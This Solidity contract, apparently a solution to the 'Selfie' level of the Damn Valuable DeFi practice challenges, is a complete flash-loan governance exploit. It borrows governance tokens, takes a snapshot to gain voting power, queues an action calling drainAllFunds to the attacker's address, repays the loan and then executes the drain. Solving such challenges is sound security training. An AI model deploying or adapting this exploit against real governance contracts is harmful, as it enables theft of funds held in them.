pragma solidity ^0.6.0;

import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackerSelfie {
    address private _owner;
    uint256 private _actionId;
    SimpleGovernance private _governance;

    constructor(address govAddress) public {
        _owner = msg.sender;
        _governance = SimpleGovernance(govAddress);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot token =
            DamnValuableTokenSnapshot(tokenAddress);
        token.snapshot();

        bytes memory callData =
            abi.encodeWithSignature("drainAllFunds(address)", _owner);

        _actionId = _governance.queueAction(msg.sender, callData, 0);

        token.transfer(msg.sender, amount);
    }

    function exploit(address selfiePoolAddress, uint256 amount) public {
        SelfiePool(selfiePoolAddress).flashLoan(amount);
    }

    function drain() public {
        _governance.executeAction(_actionId);
    }
}
